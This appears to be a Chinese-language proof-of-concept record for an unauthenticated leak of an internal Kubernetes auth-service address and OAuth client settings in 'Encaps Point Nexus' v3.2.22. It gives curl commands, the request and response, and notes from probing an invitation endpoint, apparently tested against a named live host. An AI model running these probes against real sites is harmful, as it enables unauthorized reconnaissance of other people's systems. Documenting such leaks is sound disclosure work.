# Encaps Point Nexus /system/zone-load/layouts-doc 未认证泄露内部 K8s 服务地址与 OAuth 客户端配置

- **code**: encaps-point-nexus-zone-load-layouts-doc-unauth-internal-lea
- **kind**: poc
- **category**: info-leak
- **component**: Encaps Point Nexus v3.2.22
- **versions**: v3.2.22
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 本机 Windows/ARTEX bash（经平台记录代理），2026-11-11 15:3x-15:5x UTC，curl 8.5.0。阴性基线：无 Cookie GET /api/currencies -> HTTP 302 location /signin（受保护路由统一退登录）。命中：无 Cookie GET https://dms.greenmangaming.com/system/zone-load/layouts-doc -> HTTP 200、application/json;charset=UTF-8、10758B，body._zoneAppConfig.oauthClient 含 internalBaseUrl=http://internal-auth.encaps-prod02.svc.cluster.local:60103、providerID/appID/redirectUri、scopes:user:full，clientSecret 被掩码为 ********。nslookup internal-auth.encaps-prod02.svc.cluster.local 8.8.8.8 -> NXDOMAIN，证明为仅集群内可达的内部拓扑，非预期对外暴露。
- **path**: pocs/encaps-point-nexus-zone-load-layouts-doc-unauth-internal-lea/poc.http
- **created_at**: 2026-11-11T15:55:39.384Z
- **engine**: dms.greenmangaming.com

## 描述

Encaps Point Nexus（dms.<target>，v3.2.22）的 /system/zone-load/layouts-doc 无需任何认证即返回 application/json，其中 _zoneAppConfig.oauthClient 暴露后端内部 Kubernetes 集群服务地址（http://internal-auth.<cluster>.svc.cluster.local:60103）以及 providerID/appID/redirectUri 等 OAuth 客户端配置（clientSecret 被掩码）。该内部主机名公网 DNS NXDOMAIN，属仅集群内可达的内部拓扑信息，非预期对外暴露。纯匿名 GET，低噪。

## 用法

```
前提：目标为 Encaps Point Nexus（dms 子域），无需任何账号/Cookie/凭据，纯匿名 HTTP GET。
1) 阴性对照（确认站点 API 受认证保护，避免误报）：curl -i --http2 'https://dms.<target>/api/currencies'  -> 应 HTTP 302 location /signin。
2) 命中：curl -s --http2 'https://dms.<target>/system/zone-load/layouts-doc'  -> HTTP 200 application/json，读 body._zoneAppConfig.oauthClient.internalBaseUrl 是否形如 http://internal-auth.<cluster>.svc.cluster.local:<port>。
判据：200 + JSON 且 internalBaseUrl 指向 *.svc.cluster.local 内部集群服务（公网 DNS NXDOMAIN 佐证其为内部拓扑），并含 providerID/appID/redirectUri/scopes。测前务必先做 302 阴性对照，避免把 SPA 回落页当泄露。
```

## 正文

```
# Encaps Point Nexus /system/zone-load/layouts-doc 未认证泄露内部 K8s 服务地址与 OAuth 客户端配置

## 组件 / 版本
Encaps Point Nexus v3.2.22（dms.<target>；OAuth IdP baseUrl 形如 https://<idp>.encaps.io）

## 前置条件
无需任何账号 / Cookie / 凭据。纯匿名 HTTP GET。

## 复现

### 阴性基线（确认该站点 API 受认证保护，避免误报）
GET /api/currencies HTTP/2
Host: dms.<target>
(无 Cookie)

-> HTTP/2 302
   location: /signin?redirect=...    （受保护路由统一退回登录）

### 命中：未认证读取内部配置
GET /system/zone-load/layouts-doc HTTP/2
Host: dms.<target>
(无 Cookie)

-> HTTP/2 200
   Content-Type: application/json;charset=UTF-8
   Body(~10758B):
{
  "_zoneAppConfig": {
    "baseUrl": "https://dms.<target>",
    "oauthClient": {
      "clientId": "<base64 串>",
      "clientSecret": "********",                 # 服务端已掩码
      "redirectUri": "https://dms.<target>/oauth",
      "signoutRedirectUri": "https://dms.<target>/signedout",
      "internalBaseUrl": "http://internal-auth.<cluster>.svc.cluster.local:60103",  # 内部 K8s 服务
      "baseUrl": "https://<idp>.encaps.io",
      "scopes": ":user:full"
    },
    "appID": "<uuid>",
    "providerID": "<uuid>"
  }
}

## 判据
- 匿名 GET 返回 200 + application/json，body._zoneAppConfig.oauthClient.internalBaseUrl 指向 *.svc.cluster.local 内部集群服务；
- 同时含 providerID / appID / redirectUri / scopes 等 OAuth 客户端配置；
- 内部主机名公网 DNS 解析 NXDOMAIN（nslookup internal-auth.<cluster>.svc.cluster.local 8.8.8.8 -> NXDOMAIN），佐证其为仅集群内可达的内部拓扑，属非预期对外暴露；
- clientSecret 被掩码为 ********，未直接泄露密钥（故定级 low）。

## 关联面（探索记录）
/api/users/invitation/finalize 是该 /api 前缀下唯一绕过认证中间件的写接口（邀请接受流程）：
- POST 空 body {} -> 422 {"success":false,"errors":[{"message":"Missing required parameter","code":"PRM001"}]}
- POST 带伪 token -> 500 {"success":false,"errors":[{"message":"Unknown error","code":"UNK001"}]}
受不可猜解的邀请 token 约束，无有效/无效 token 的判别差分，仅作定性记录。

## 来源
provenance: 本机 Windows/ARTEX bash shell（经平台记录代理），2026-11-11 15:3x-15:5x UTC，curl 8.5.0。

```
